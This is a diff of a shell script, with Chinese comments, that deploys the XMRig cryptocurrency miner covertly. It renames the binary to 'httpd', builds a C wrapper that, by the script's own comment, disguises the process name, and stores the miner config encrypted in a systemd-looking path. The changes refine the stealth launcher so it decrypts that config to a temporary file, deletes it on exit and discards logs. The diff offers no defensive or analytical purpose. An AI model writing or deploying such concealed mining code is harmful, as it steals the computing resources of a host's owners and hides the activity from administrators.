@@ -33,7 +33,7 @@ mv /opt/xmrig/xmrig-6.22.2/xmrig /opt/xmrig/httpd || { echo "移动文件失败"
 chmod +x /opt/xmrig/httpd
 rm -rf /opt/xmrig/xmrig-6.22.2
 
-# 创建 wrapper 以伪装进程名并限制进程数
+# 创建 wrapper 以伪装进程名
 cat > /opt/xmrig/wrapper.c <<EOF
 #include <sys/prctl.h>
 #include <unistd.h>
@@ -73,10 +73,10 @@ rm "$config_file"
 cat > /opt/xmrig/start.sh <<EOF
 #!/bin/bash
 CONFIG="/etc/systemd/conf.d/httpd.conf.enc"
-TEMP_CONFIG="/tmp/httpd.conf"
-openssl enc -aes-256-cbc -d -in \$CONFIG -out \$TEMP_CONFIG -k "$encrypt_pass"
-exec /opt/xmrig/wrapper --config=\$TEMP_CONFIG --no-color --log-file=/dev/null
-rm \$TEMP_CONFIG
+TEMP_CONFIG="/tmp/httpd.conf.\$\$"
+trap 'rm -f \$TEMP_CONFIG' EXIT
+openssl enc -aes-256-cbc -d -in \$CONFIG -out \$TEMP_CONFIG -k "$encrypt_pass" || exit 1
+/opt/xmrig/wrapper --config=\$TEMP_CONFIG --no-color --log-file=/dev/null
 EOF
 chmod +x /opt/xmrig/start.sh
 
